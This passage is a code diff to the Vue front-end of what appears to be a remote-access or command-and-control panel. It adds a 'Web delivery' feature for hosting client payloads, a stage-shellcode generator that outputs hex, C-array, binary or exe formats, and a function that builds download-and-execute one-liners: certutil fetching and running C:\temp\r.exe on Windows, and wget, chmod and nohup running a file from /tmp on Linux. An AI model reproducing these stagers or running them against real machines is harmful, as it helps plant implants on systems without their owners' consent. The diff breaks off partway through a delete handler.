@@ -6,50 +6,500 @@
         <h1 class="page-title">客户端生成</h1>
         <p class="page-subtitle">配置并生成适用于不同系统的远程客户端</p>
       </div>
-      <div class="header-stats">
-        <div class="stat-item">
-          <el-icon class="stat-icon platform-icon"><Monitor /></el-icon>
-          <div class="stat-info">
-            <div class="stat-value">{{ platformCount }}</div>
-            <div class="stat-label">支持平台</div>
+    </div>
+
+    <!-- 功能选择卡片 -->
+    <el-card class="function-selector-card" shadow="hover">
+      <div class="function-selector">
+        <div
+            v-for="func in functions"
+            :key="func.value"
+            class="function-option"
+            :class="{ 'function-selected': activeFunction === func.value }"
+            @click="activeFunction = func.value"
+        >
+          <div class="function-icon-wrapper">
+            <el-icon :class="['function-icon', `function-${func.value}`]">
+              <component :is="func.icon" />
+            </el-icon>
           </div>
-        </div>
-        <div class="stat-item">
-          <el-icon class="stat-icon arch-icon"><Cpu /></el-icon>
-          <div class="stat-info">
-            <div class="stat-value">{{ archCount }}</div>
-            <div class="stat-label">架构类型</div>
+          <div class="function-info">
+            <div class="function-name">{{ func.label }}</div>
+            <div class="function-desc">{{ func.description }}</div>
           </div>
         </div>
       </div>
-    </div>
+    </el-card>
 
-    <!-- 生成配置卡片 -->
-    <el-card class="config-card" shadow="hover">
-      <template #header>
-        <div class="card-header">
-          <div class="header-left">
-            <el-icon class="card-icon"><Setting /></el-icon>
-            <h3 class="card-title">生成配置</h3>
+    <!-- 客户端生成功能 -->
+    <template v-if="activeFunction === 'client'">
+      <!-- 生成配置卡片 -->
+      <el-card class="config-card" shadow="hover">
+        <template #header>
+          <div class="card-header">
+            <div class="header-left">
+              <el-icon class="card-icon"><Setting /></el-icon>
+              <h3 class="card-title">生成配置</h3>
+            </div>
+            <div class="header-right">
+              <el-tag type="success" size="small">实时生成</el-tag>
+            </div>
           </div>
-          <div class="header-right">
-            <el-tag type="success" size="small">实时生成</el-tag>
+        </template>
+
+        <div class="config-form">
+          <el-form :model="formData" label-position="top" class="generator-form">
+            <!-- Listener 选择 -->
+            <el-form-item label="监听器" required>
+              <el-select
+                  v-model="formData.listener"
+                  placeholder="选择监听器"
+                  class="form-select"
+                  @visible-change="handleDropdown"
+                  :loading="loadingListeners"
+                  clearable
+                  filterable
+                  autocomplete="off"
+              >
+                <template #prefix>
+                  <el-icon><Connection /></el-icon>
+                </template>
+                <el-option
+                    v-for="item in listenerOptions"
+                    :key="item"
+                    :label="item"
+                    :value="item"
+                >
+                  <div class="listener-option">
+                    <el-icon class="option-icon"><Connection /></el-icon>
+                    <span class="option-label">{{ item }}</span>
+                  </div>
+                </el-option>
+                <template #empty>
+                  <div class="empty-option">暂无可用监听器</div>
+                </template>
+              </el-select>
+              <div class="form-hint">选择客户端连接的监听器地址</div>
+            </el-form-item>
+
+            <!-- 操作系统选择 -->
+            <el-form-item label="操作系统" required>
+              <div class="os-selector">
+                <div
+                    v-for="os in osOptions"
+                    :key="os.value"
+                    class="os-option"
+                    :class="{ 'os-selected': formData.os === os.value }"
+                    @click="selectOS(os.value)"
+                >
+                  <div class="os-icon-wrapper">
+                    <el-icon :class="['os-icon', `os-${os.value}`]">
+                      <component :is="os.icon" />
+                    </el-icon>
+                  </div>
+                  <div class="os-info">
+                    <div class="os-name">{{ os.label }}</div>
+                    <div class="os-arch-count">
+                      {{ archMapping[os.value]?.length || 0 }} 种架构
+                    </div>
+                  </div>
+                  <el-icon
+                      v-if="formData.os === os.value"
+                      class="os-check"
+                  >
+                    <Check />
+                  </el-icon>
+                </div>
+              </div>
+            </el-form-item>
+
+            <!-- 架构选择 -->
+            <el-form-item label="系统架构" required>
+              <div class="arch-grid">
+                <div
+                    v-for="arch in archOptions"
+                    :key="arch"
+                    class="arch-option"
+                    :class="{
+                    'arch-selected': formData.arch === arch,
+                    'arch-disabled': !formData.os
+                  }"
+                    @click="formData.os && selectArch(arch)"
+                >
+                  <div class="arch-icon">
+                    <el-icon class="arch-icon-svg"><Cpu /></el-icon>
+                  </div>
+                  <div class="arch-info">
+                    <div class="arch-name">{{ arch.toUpperCase() }}</div>
+                    <div class="arch-desc">{{ getArchDescription(arch) }}</div>
+                  </div>
+                </div>
+              </div>
+              <div class="form-hint">根据目标系统选择合适的处理器架构</div>
+            </el-form-item>
+
+            <!-- 上线密码 -->
+            <el-form-item label="连接密码">
+              <div class="password-input-wrapper">
+                <el-input
+                    v-model="formData.pass"
+                    placeholder="输入客户端连接密码"
+                    type="password"
+                    show-password
+                    clearable
+                    class="password-input"
+                    :maxlength="32"
+                    autocomplete="new-password"
+                >
+                  <template #prefix>
+                    <el-icon><Lock /></el-icon>
+                  </template>
+                </el-input>
+                <el-tooltip content="生成随机密码" placement="top">
+                  <el-button
+                      class="generate-password-btn"
+                      @click="generateRandomPassword"
+                      :icon="Refresh"
+                      circle
+                      size="small"
+                  />
+                </el-tooltip>
+              </div>
+              <div class="form-hint">客户端连接时使用的验证密码（可选，8-32位字符）</div>
+              <div v-if="formData.pass" class="password-strength">
+                <div class="strength-meter">
+                  <div
+                      class="strength-bar"
+                      :style="{ width: `${passwordStrength}%` }"
+                  ></div>
+                </div>
+                <span class="strength-text">密码强度：{{ passwordStrengthText }}</span>
+              </div>
+            </el-form-item>
+
+            <!-- 生成按钮 -->
+            <el-form-item>
+              <el-button
+                  type="primary"
+                  @click="handleGenerate"
+                  :disabled="!isFormValid"
+                  :loading="generating"
+                  class="generate-btn"
+                  size="large"
+              >
+                <el-icon><Download /></el-icon>
+                生成客户端
+              </el-button>
+              <div class="form-hint" v-if="isFormValid">
+                将生成 {{ getFileName() }} 客户端文件
+              </div>
+            </el-form-item>
+          </el-form>
+        </div>
+      </el-card>
+
+      <!-- 使用命令参考 -->
+      <el-card class="commands-card" shadow="hover">
+        <template #header>
+          <div class="card-header">
+            <div class="header-left">
+              <el-icon class="card-icon"><Promotion /></el-icon>
+              <h3 class="card-title">使用命令参考</h3>
+            </div>
+            <div class="header-right">
+              <el-tooltip content="复制所有命令" placement="top">
+                <el-button
+                    type="info"
+                    size="small"
+                    :icon="CopyDocument"
+                    @click="copyAllCommands"
+                >
+                  一键复制
+                </el-button>
+              </el-tooltip>
+            </div>
+          </div>
+        </template>
+
+        <div class="commands-grid">
+          <div
+              v-for="(cmd, index) in commands"
+              :key="index"
+              class="command-card"
+              :class="`command-type-${index % 4}`"
+          >
+            <div class="command-header">
+              <div class="command-type">
+                <el-icon class="type-icon">
+                  <component :is="cmd.icon" />
+                </el-icon>
+                <span class="type-name">{{ cmd.name }}</span>
+              </div>
+              <el-tooltip content="复制命令" placement="top">
+                <el-button
+                    type="text"
+                    :icon="CopyDocument"
+                    @click="copyToClipboard(cmd.code)"
+                    class="copy-btn"
+                />
+              </el-tooltip>
+            </div>
+            <div class="command-content">
+              <pre class="command-code">{{ cmd.code }}</pre>
+              <div class="command-desc">{{ cmd.description }}</div>
+            </div>
           </div>
         </div>
-      </template>
+      </el-card>
+    </template>
 
-      <div class="config-form">
-        <el-form :model="formData" label-position="top" class="generator-form">
-          <!-- Listener 选择 -->
+    <!-- Web投递功能 -->
+    <template v-else-if="activeFunction === 'web'">
+      <!-- 统计卡片 -->
+      <div class="stats-cards">
+        <el-card class="stat-card">
+          <div class="stat-content">
+            <el-icon class="stat-icon total-icon"><DataLine /></el-icon>
+            <div class="stat-info">
+              <div class="stat-value">{{ webTableData.length }}</div>
+              <div class="stat-label">总数</div>
+            </div>
+          </div>
+        </el-card>
+
+        <el-card class="stat-card">
+          <div class="stat-content">
+            <el-icon class="stat-icon active-icon"><CircleCheck /></el-icon>
+            <div class="stat-info">
+              <div class="stat-value">{{ activeDeliveries }}</div>
+              <div class="stat-label">活跃</div>
+            </div>
+          </div>
+        </el-card>
+
+        <el-card class="stat-card">
+          <div class="stat-content">
+            <el-icon class="stat-icon inactive-icon"><CircleClose /></el-icon>
+            <div class="stat-info">
+              <div class="stat-value">{{ inactiveDeliveries }}</div>
+              <div class="stat-label">未启动</div>
+            </div>
+          </div>
+        </el-card>
+      </div>
+
+      <!-- 主表格 -->
+      <el-card class="main-table-card" shadow="hover">
+        <template #header>
+          <div class="table-header">
+            <h3 class="table-title">WebDelivery 列表</h3>
+            <div class="table-actions">
+              <el-button
+                  type="primary"
+                  size="small"
+                  @click="dialogVisible = true"
+              >
+                <el-icon><Plus /></el-icon>
+                新增
+              </el-button>
+              <el-tooltip content="刷新列表" placement="top">
+                <el-button
+                    type="info"
+                    size="small"
+                    @click="getWebDeliveryList"
+                    :loading="webLoading"
+                >
+                  <el-icon><Refresh /></el-icon>
+                </el-button>
+              </el-tooltip>
+            </div>
+          </div>
+        </template>
+
+        <el-table
+            :data="webTableData"
+            class="custom-table"
+            v-loading="webLoading"
+            empty-text="暂无WebDelivery数据"
+        >
+          <el-table-column prop="ListenerConfig" label="监听器" min-width="180">
+            <template #default="{ row }">
+              <div class="listener-cell">
+                <el-icon class="listener-icon"><Connection /></el-icon>
+                <div class="listener-content">
+                  <div class="listener-text">{{ row.ListenerConfig }}</div>
+                  <div class="listener-label">监听器配置</div>
+                </div>
+              </div>
+            </template>
+          </el-table-column>
+
+          <el-table-column prop="OS" label="操作系统" width="140">
+            <template #default="{ row }">
+              <el-tag
+                  :type="row.OS === 'windows' ? 'primary' : row.OS === 'linux' ? 'success' : 'info'"
+                  class="os-tag"
+                  effect="light"
+                  round
+              >
+                {{ row.OS }}
+              </el-tag>
+            </template>
+          </el-table-column>
+
+          <el-table-column prop="Arch" label="架构" width="120">
+            <template #default="{ row }">
+              <div class="arch-cell">
+                <el-icon class="arch-icon"><Cpu /></el-icon>
+                <span class="arch-text">{{ row.Arch.toUpperCase() }}</span>
+              </div>
+            </template>
+          </el-table-column>
+
+          <el-table-column prop="Pass" label="上线密码" width="150">
+            <template #default="{ row }">
+              <div class="password-cell">
+                <el-icon class="password-icon"><Lock /></el-icon>
+                <span class="password-text">{{ row.Pass || '未设置' }}</span>
+              </div>
+            </template>
+          </el-table-column>
+
+          <el-table-column prop="ListeningPort" label="监听端口" width="120">
+            <template #default="{ row }">
+              <div class="port-cell">
+                <el-tag type="info" effect="plain" class="port-tag">
+                  {{ row.ListeningPort }}
+                </el-tag>
+              </div>
+            </template>
+          </el-table-column>
+
+          <el-table-column label="状态" width="120">
+            <template #default="{ row }">
+              <div class="status-cell">
+                <div
+                    class="status-dot"
+                    :class="{ 'status-active': row.Status === 1, 'status-inactive': row.Status === 2 }"
+                ></div>
+                <el-tag
+                    :type="row.Status === 1 ? 'success' : 'danger'"
+                    size="small"
+                    class="status-tag"
+                    effect="light"
+                >
+                  {{ row.Status === 1 ? '运行中' : '已停止' }}
+                </el-tag>
+              </div>
+            </template>
+          </el-table-column>
+
+          <el-table-column label="操作" width="280">
+            <template #default="{ row }">
+              <div class="action-buttons">
+                <el-popover
+                    placement="top-start"
+                    :width="row.OS === 'windows' ? 480 : 520"
+                    trigger="click"
+                    class="command-popover"
+                >
+                  <template #reference>
+                    <el-button
+                        size="small"
+                        type="success"
+                        :disabled="row.Status !== 1"
+                        class="action-btn"
+                    >
+                      <el-tooltip content="查看上线命令" placement="top">
+                        <el-icon><Promotion /></el-icon>
+                      </el-tooltip>
+                    </el-button>
+                  </template>
+                  <div class="command-content">
+                    <h4 class="command-title">上线命令</h4>
+                    <pre class="command-code">{{ generateWebCommand(row) }}</pre>
+                    <div class="command-actions">
+                      <el-button
+                          size="small"
+                          type="primary"
+                          @click="copyToClipboard(generateWebCommand(row))"
+                      >
+                        <el-icon><CopyDocument /></el-icon>
+                        复制命令
+                      </el-button>
+                    </div>
+                  </div>
+                </el-popover>
+
+                <el-tooltip
+                    v-if="row.OS === 'windows' && row.Status === 1"
+                    content="生成Shellcode"
+                    placement="top"
+                >
+                  <el-button
+                      size="small"
+                      type="warning"
+                      class="action-btn"
+                      @click="openShellcodeDialog(row)"
+                  >
+                    <el-icon><MagicStick /></el-icon>
+                  </el-button>
+                </el-tooltip>
+
+                <el-tooltip
+                    :content="row.Status === 1 ? '停止服务' : '启动服务'"
+                    placement="top"
+                >
+                  <el-button
+                      size="small"
+                      :type="row.Status === 1 ? 'primary' : 'success'"
+                      class="action-btn"
+                      @click="row.Status === 1 ? handleWebClose(row) : handleWebOpen(row)"
+                  >
+                    <el-icon>
+                      <component :is="row.Status === 1 ? VideoPause : VideoPlay" />
+                    </el-icon>
+                  </el-button>
+                </el-tooltip>
+
+                <el-tooltip content="删除" placement="top">
+                  <el-button
+                      size="small"
+                      type="danger"
+                      class="action-btn"
+                      @click="handleWebDelete(row)"
+                  >
+                    <el-icon><Delete /></el-icon>
+                  </el-button>
+                </el-tooltip>
+              </div>
+            </template>
+          </el-table-column>
+        </el-table>
+      </el-card>
+    </template>
+
+    <!-- WebDelivery新增对话框 -->
+    <el-dialog
+        v-model="dialogVisible"
+        title="配置 WebDelivery"
+        width="750px"
+        class="add-dialog"
+        :close-on-click-modal="false"
+    >
+      <div class="dialog-content">
+        <el-form :model="webFormData" label-position="top" class="config-form">
           <el-form-item label="监听器" required>
             <el-select
-                v-model="formData.listener"
+                v-model="webFormData.listener"
                 placeholder="选择监听器"
                 class="form-select"
                 @visible-change="handleDropdown"
                 :loading="loadingListeners"
                 clearable
                 filterable
+                size="large"
+                autocomplete="off"
             >
               <template #prefix>
                 <el-icon><Connection /></el-icon>
@@ -69,76 +519,98 @@
                 <div class="empty-option">暂无可用监听器</div>
               </template>
             </el-select>
-            <div class="form-hint">选择客户端连接的监听器地址</div>
+            <div class="form-hint">客户端连接的监听器地址</div>
           </el-form-item>
 
-          <!-- 操作系统选择 -->
-          <el-form-item label="操作系统" required>
-            <div class="os-selector">
-              <div
-                  v-for="os in osOptions"
-                  :key="os.value"
-                  class="os-option"
-                  :class="{ 'os-selected': formData.os === os.value }"
-                  @click="selectOS(os.value)"
-              >
-                <div class="os-icon-wrapper">
-                  <el-icon :class="['os-icon', `os-${os.value}`]">
-                    <component :is="os.icon" />
-                  </el-icon>
-                </div>
-                <div class="os-info">
-                  <div class="os-name">{{ os.label }}</div>
-                  <div class="os-arch-count">
-                    {{ archMapping[os.value]?.length || 0 }} 种架构
-                  </div>
-                </div>
-                <el-icon
-                    v-if="formData.os === os.value"
-                    class="os-check"
+          <div class="row-group">
+            <el-form-item label="操作系统" required class="half-width">
+              <div class="os-selector">
+                <div
+                    v-for="os in osOptions"
+                    :key="os.value"
+                    class="os-option"
+                    :class="{ 'os-selected': webFormData.os === os.value }"
+                    @click="selectWebOS(os.value)"
                 >
-                  <Check />
-                </el-icon>
+                  <div class="os-icon-wrapper">
+                    <el-icon :class="['os-icon', `os-${os.value}`]">
+                      <component :is="os.icon" />
+                    </el-icon>
+                  </div>
+                  <div class="os-name">{{ os.label }}</div>
+                </div>
               </div>
-            </div>
-          </el-form-item>
+            </el-form-item>
 
-          <!-- 架构选择 -->
-          <el-form-item label="系统架构" required>
-            <div class="arch-grid">
-              <div
-                  v-for="arch in archOptions"
-                  :key="arch"
-                  class="arch-option"
-                  :class="{
-                  'arch-selected': formData.arch === arch,
-                  'arch-disabled': !formData.os
-                }"
-                  @click="formData.os && selectArch(arch)"
+            <el-form-item label="系统架构" required class="half-width">
+              <el-select
+                  v-model="webFormData.arch"
+                  placeholder="选择架构"
+                  :disabled="!webFormData.os"
+                  size="large"
+                  class="arch-select"
               >
-                <div class="arch-icon">
-                  <el-icon class="arch-icon-svg"><Cpu /></el-icon>
-                </div>
-                <div class="arch-info">
-                  <div class="arch-name">{{ arch.toUpperCase() }}</div>
-                  <div class="arch-desc">{{ getArchDescription(arch) }}</div>
-                </div>
-              </div>
-            </div>
-            <div class="form-hint">根据目标系统选择合适的处理器架构</div>
-          </el-form-item>
+                <template #prefix>
+                  <el-icon><Cpu /></el-icon>
+                </template>
+                <el-option
+                    v-for="arch in webArchOptions"
+                    :key="arch"
+                    :label="arch.toUpperCase()"
+                    :value="arch"
+                >
+                  <div class="arch-option-item">
+                    <el-icon><Cpu /></el-icon>
+                    <span class="arch-label">{{ arch.toUpperCase() }}</span>
+                    <span class="arch-desc">{{ getArchDescription(arch) }}</span>
+                  </div>
+                </el-option>
+              </el-select>
+            </el-form-item>
+          </div>
 
-          <!-- 上线密码 -->
+          <div class="row-group">
+            <el-form-item label="监听端口" required class="half-width">
+              <el-input
+                  v-model="webFormData.port"
+                  placeholder="如: 8080"
+                  size="large"
+                  clearable
+              >
+                <template #prefix>
+                  <el-icon><Monitor /></el-icon>
+                </template>
+              </el-input>
+              <div class="form-hint">Web服务的监听端口</div>
+            </el-form-item>
+
+            <el-form-item label="文件名称" class="half-width">
+              <el-input
+                  v-model="webFormData.filename"
+                  placeholder="如: download.exe"
+                  size="large"
+                  clearable
+              >
+                <template #prefix>
+                  <el-icon><Document /></el-icon>
+                </template>
+              </el-input>
+              <div class="form-hint">客户端文件下载名称</div>
+            </el-form-item>
+          </div>
+
           <el-form-item label="连接密码">
             <div class="password-input-wrapper">
               <el-input
-                  v-model="formData.pass"
-                  placeholder="输入客户端连接密码"
+                  v-model="webFormData.pass"
+                  placeholder="可选，客户端连接密码"
                   type="password"
                   show-password
                   clearable
+                  size="large"
                   class="password-input"
                   :maxlength="32"
+                  autocomplete="new-password"
               >
                 <template #prefix>
                   <el-icon><Lock /></el-icon>
@@ -147,115 +619,105 @@
               <el-tooltip content="生成随机密码" placement="top">
                 <el-button
                     class="generate-password-btn"
-                    @click="generateRandomPassword"
+                    @click="generateRandomWebPassword"
                     :icon="Refresh"
                     circle
                     size="small"
                 />
               </el-tooltip>
             </div>
-            <div class="form-hint">客户端连接时使用的验证密码（可选，8-32位字符）</div>
-            <div v-if="formData.pass" class="password-strength">
-              <div class="strength-meter">
-                <div
-                    class="strength-bar"
-                    :style="{ width: `${passwordStrength}%` }"
-                ></div>
-              </div>
-              <span class="strength-text">密码强度：{{ passwordStrengthText }}</span>
-            </div>
+            <div class="form-hint">客户端连接验证密码（可选）</div>
           </el-form-item>
+        </el-form>
+      </div>
 
-          <!-- 生成按钮 -->
-          <el-form-item>
-            <el-button
-                type="primary"
-                @click="handleGenerate"
-                :disabled="!isFormValid"
-                :loading="generating"
-                class="generate-btn"
-                size="large"
-            >
-              <el-icon><Download /></el-icon>
-              生成客户端
-            </el-button>
-            <div class="form-hint" v-if="isFormValid">
-              将生成 {{ getFileName() }} 客户端文件
+      <template #footer>
+        <div class="dialog-footer">
+          <el-button @click="dialogVisible = false" :disabled="submitting">
+            取消
+          </el-button>
+          <el-button
+              type="primary"
+              @click="handleWebDelivery"
+              :loading="submitting"
+              :disabled="!isWebFormValid"
+          >
+            <template #default>
+              <span v-if="!submitting">创建 WebDelivery</span>
+              <span v-else>创建中...</span>
+            </template>
+          </el-button>
+        </div>
+      </template>
+    </el-dialog>
+
+    <!-- Shellcode生成对话框 -->
+    <el-dialog
+        v-model="dialogVisible2"
+        title="生成 Stage Shellcode"
+        width="480px"
+        class="shellcode-dialog"
+        :close-on-click-modal="false"
+    >
+      <div class="dialog-content">
+        <div class="shellcode-info">
+          <div class="info-item">
+            <span class="info-label">监听器：</span>
+            <span class="info-value">{{ selectedListener }}</span>
+          </div>
+          <div class="info-item">
+            <span class="info-label">端口：</span>
+            <span class="info-value">{{ selectedPort }}</span>
+          </div>
+        </div>
+
+        <el-form :model="selectedFormat" label-position="top" class="format-form">
+          <el-form-item label="输出格式" required>
+            <div class="format-grid">
+              <div
+                  v-for="format in formatOptions"
+                  :key="format.value"
+                  class="format-option"
+                  :class="{ 'format-selected': selectedFormat.format === format.value }"
+                  @click="selectedFormat.format = format.value"
+              >
+                <div class="format-icon">
+                  <el-icon class="format-icon-svg">
+                    <component :is="format.icon" />
+                  </el-icon>
+                </div>
+                <div class="format-info">
+                  <div class="format-name">{{ format.label }}</div>
+                  <div class="format-desc">{{ format.description }}</div>
+                </div>
+                <el-icon
+                    v-if="selectedFormat.format === format.value"
+                    class="format-check"
+                >
+                  <Check />
+                </el-icon>
+              </div>
             </div>
           </el-form-item>
         </el-form>
       </div>
-    </el-card>
 
-    <!-- 使用命令参考 -->
-    <el-card class="commands-card" shadow="hover">
-      <template #header>
-        <div class="card-header">
-          <div class="header-left">
-            <el-icon class="card-icon"><Promotion /></el-icon>
-            <h3 class="card-title">使用命令参考</h3>
-          </div>
-          <div class="header-right">
-            <el-tooltip content="复制所有命令" placement="top">
-              <el-button
-                  type="info"
-                  size="small"
-                  :icon="CopyDocument"
-                  @click="copyAllCommands"
-              >
-                一键复制
-              </el-button>
-            </el-tooltip>
-          </div>
+      <template #footer>
+        <div class="dialog-footer">
+          <el-button @click="dialogVisible2 = false">
+            取消
+          </el-button>
+          <el-button
+              type="primary"
+              @click="handleStageShellcode"
+              :loading="generatinBackendTemplatecode"
+              :disabled="!selectedFormat.format"
+          >
+            生成并下载
+          </el-button>
         </div>
       </template>
-
-      <div class="commands-grid">
-        <div
-            v-for="(cmd, index) in commands"
-            :key="index"
-            class="command-card"
-            :class="`command-type-${index % 4}`"
-        >
-          <div class="command-header">
-            <div class="command-type">
-              <el-icon class="type-icon">
-                <component :is="cmd.icon" />
-              </el-icon>
-              <span class="type-name">{{ cmd.name }}</span>
-            </div>
-            <el-tooltip content="复制命令" placement="top">
-              <el-button
-                  type="text"
-                  :icon="CopyDocument"
-                  @click="copyToClipboard(cmd.code)"
-                  class="copy-btn"
-              />
-            </el-tooltip>
-          </div>
-          <div class="command-content">
-            <pre class="command-code">{{ cmd.code }}</pre>
-            <div class="command-desc">{{ cmd.description }}</div>
-          </div>
-        </div>
-      </div>
-    </el-card>
-
-<!--    &lt;!&ndash; 帮助提示 &ndash;&gt;-->
-<!--    <el-card class="help-card" shadow="never">-->
-<!--      <div class="help-content">-->
-<!--        <el-icon class="help-icon"><InfoFilled /></el-icon>-->
-<!--        <div class="help-text">-->
-<!--          <h4>生成说明</h4>-->
-<!--          <p>-->
-<!--            1. 客户端文件为独立可执行程序，无需额外依赖<br>-->
-<!--            2. 请确保目标系统与选择的架构相匹配<br>-->
-<!--            3. 连接密码用于客户端身份验证，请妥善保管<br>-->
-<!--            4. Windows 客户端会自动添加 .exe 扩展名-->
-<!--          </p>-->
-<!--        </div>-->
-<!--      </div>-->
-<!--    </el-card>-->
+    </el-dialog>
   </div>
 </template>
 
@@ -278,9 +740,26 @@ import {
   MagicStick,
   Odometer,
   ChatLineSquare,
-  SwitchButton
+  SwitchButton,
+  DataLine,
+  CircleCheck,
+  CircleClose,
+  Document,
+  VideoPlay,
+  VideoPause,
+  Delete,
+  Warning,
+  SuccessFilled
 } from '@element-plus/icons-vue';
 import ClientAPI from "@/api/clients";
+
+// 功能选项
+const functions = [
+  { label: '客户端生成', value: 'client', icon: Download, description: '生成独立的客户端可执行程序' },
+  { label: 'Web投递', value: 'web', icon: Promotion, description: '通过Web服务投递客户端程序' }
+];
+
+const activeFunction = ref('client');
 
 // 操作系统选项
 const osOptions = [
@@ -309,12 +788,19 @@ const archDescriptions: Record<string, string> = {
   'mips64le': 'MIPS 64位 (小端)'
 };
 
-// 状态
+// 格式选项
+const formatOptions = [
+  { value: 'hex', label: '十六进制', icon: Warning, description: 'HEX格式Shellcode' },
+  { value: 'c', label: 'C 数组', icon: Document, description: 'C语言数组格式' },
+  { value: 'bin', label: '二进制', icon: SuccessFilled, description: '原始二进制文件' },
+  { value: 'exe', label: '可执行程序', icon: Download, description: 'Windows可执行文件' }
+];
+
+// 客户端生成相关
 const listenerOptions = ref<string[]>([]);
 const loadingListeners = ref(false);
 const generating = ref(false);
 
-// 表单数据
 const formData = reactive({
   listener: '',
   os: '',
@@ -322,34 +808,54 @@ const formData = reactive({
   pass: ''
 });
 
-// 架构选项
 const archOptions = ref<string[]>([]);
 
+// Web投递相关
+const webTableData = ref([]);
+const webLoading = ref(false);
+const dialogVisible = ref(false);
+const dialogVisible2 = ref(false);
+const submitting = ref(false);
+const generatinBackendTemplatecode = ref(false);
+const webFormData = reactive({
+  port: '',
+  listener: '',
+  os: '',
+  arch: '',
+  filename: '',
+  pass: ''
+});
+const webArchOptions = ref<string[]>([]);
+const selectedListener = ref('');
+const selectedPort = ref('');
+const selectedFormat = reactive({ format: '' });
+
 // 计算属性
-const platformCount = computed(() => osOptions.length);
-const archCount = computed(() => {
-  let total = 0;
-  Object.values(archMapping).forEach(arr => total += arr.length);
-  return total;
+const activeDeliveries = computed(() => {
+  return (webTableData.value as any[]).filter(item => item.Status === 1).length;
+});
+
+const inactiveDeliveries = computed(() => {
+  return (webTableData.value as any[]).filter(item => item.Status === 2).length;
 });
 
 const isFormValid = computed(() => {
   return formData.listener && formData.os && formData.arch;
 });
 
+const isWebFormValid = computed(() => {
+  return webFormData.listener && webFormData.os && webFormData.arch && webFormData.port;
+});
+
 const passwordStrength = computed(() => {
   if (!formData.pass) return 0;
-
   let score = 0;
-  // 长度
   if (formData.pass.length >= 8) score += 20;
   if (formData.pass.length >= 12) score += 20;
-  // 复杂度
   if (/[a-z]/.test(formData.pass)) score += 20;
   if (/[A-Z]/.test(formData.pass)) score += 20;
   if (/[0-9]/.test(formData.pass)) score += 20;
   if (/[^a-zA-Z0-9]/.test(formData.pass)) score += 20;
-
   return Math.min(score, 100);
 });
 
@@ -412,6 +918,14 @@ const getFileName = () => {
   return fileName;
 };
 
+const generateWebCommand = (row: any) => {
+  if (row.OS === 'windows') {
+    return `certutil -urlcache -split -f ${row.ServerAddress} C:\\temp\\r.exe && C:\\temp\\r.exe ${row.Pass || ''}`;
+  } else {
+    return `wget -P /tmp ${row.ServerAddress}; chmod +x /tmp/${row.FileName}; nohup /tmp/${row.FileName} ${row.Pass || ''} > m.log 2>&1 &`;
+  }
+};
+
 const handleDropdown = async (visible: boolean) => {
   if (visible && listenerOptions.value.length === 0) {
     loadingListeners.value = true;
@@ -441,6 +955,12 @@ const selectArch = (arch: string) => {
   formData.arch = arch;
 };
 
+const selectWebOS = (os: string) => {
+  webFormData.os = os;
+  webFormData.arch = '';
+  webArchOptions.value = archMapping[os] || [];
+};
+
 const generateRandomPassword = () => {
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
   let password = '';
@@ -448,6 +968,16 @@ const generateRandomPassword = () => {
     password += chars.charAt(Math.floor(Math.random() * chars.length));
   }
   formData.pass = password;
+  ElMessage.success('已生成随机密码');
+};
+
+const generateRandomWebPassword = () => {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
+  let password = '';
+  for (let i = 0; i < 16; i++) {
+    password += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  webFormData.pass = password;
   ElMessage.success('已生成随机密码');
 };
 
@@ -467,14 +997,12 @@ const handleGenerate = async () => {
     });
 
     if (res.status === 200) {
-      // 获取文件名
       const contentDisposition = res.headers['content-disposition'] || '';
       const matches = /filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(contentDisposition);
       let fileName = matches && matches.length > 1
           ? decodeURIComponent(matches[1].replace(/['"]/g, ''))
           : getFileName();
 
-      // 创建下载
       const blob = new Blob([res.data], { type: res.headers['content-type'] });
       const downloadElement = document.createElement('a');
       const href = window.URL.createObjectURL(blob);
@@ -511,27 +1039,192 @@ const copyAllCommands = () => {
   copyToClipboard(allCommands);
 };
 
+// WebDelivery相关方法
+const getWebDeliveryList = async () => {
+  webLoading.value = true;
+  try {
+    const res = await ClientAPI.GetWebDeliveryList();
+    if (res.status === 200 && res.data.status === 200) {
+      webTableData.value = res.data.data;
+    } else {
+      ElMessage.error(res.data?.data || '获取列表失败');
+    }
+  } catch (error) {
+    console.error('获取WebDelivery列表失败:', error);
+    ElMessage.error('获取列表失败');
+  } finally {
+    webLoading.value = false;
+  }
+};
+
+const handleWebDelivery = async () => {
+  if (!isWebFormValid.value) {
+    ElMessage.warning('请填写完整的配置信息');
+    return;
+  }
+
+  submitting.value = true;
+  try {
+    const res = await ClientAPI.StartWebDelivery({
+      listener: webFormData.listener,
+      os: webFormData.os,
+      arch: webFormData.arch,
+      port: webFormData.port,
+      filename: webFormData.filename,
+      pass: webFormData.pass
+    });
+
+    if (res.status === 200 && res.data.status === 200) {
+      ElMessage.success('WebDelivery 创建成功');
+      dialogVisible.value = false;
+      resetWebForm();
+      await getWebDeliveryList();
+    } else {
+      ElMessage.error(res.data?.data || '创建失败');
+    }
+  } catch (error) {
+    console.error('创建WebDelivery失败:', error);
+    ElMessage.error('创建失败');
+  } finally {
+    submitting.value = false;
+  }
+};
+
+const handleWebClose = async (row: any) => {
+  try {
+    const res = await ClientAPI.CloseWebDelivery({ port: row.ListeningPort });
+    if (res.status === 200 && res.data.status === 200) {
+      ElMessage.success('已停止服务');
+      await getWebDeliveryList();
+    } else {
+      ElMessage.error(res.data?.data || '停止失败');
+    }
+  } catch (error) {
+    console.error('停止WebDelivery失败:', error);
+    ElMessage.error('停止失败');
+  }
+};
+
+const handleWebOpen = async (row: any) => {
+  try {
+    const res = await ClientAPI.OpenWebDelivery({ port: row.ListeningPort });
+    if (res.status === 200 && res.data.status === 200) {
+      ElMessage.success('服务已启动');
+      await getWebDeliveryList();
+    } else {
+      ElMessage.error(res.data?.data || '启动失败');
+    }
+  } catch (error) {
+    console.error('启动WebDelivery失败:', error);
+    ElMessage.error('启动失败');
+  }
+};
+
+const handleWebDelete = async (row: any) => {
+  try {
+    await ElMessageBox.confirm(
+        `确定要删除端口 ${row.ListeningPort} 的WebDelivery服务吗？`,
+        '删除确认',
+        {
+          confirmButtonText: '确定',
+          cancelButtonText: '取消',
+          type: 'warning'
+        }
+    );
+
+    const res = await ClientAPI.DeleteWebDelivery({ port: row.ListeningPort });
+    if (res.status === 200 && res.data.status === 200) {
+      ElMessage.success('删除成功');
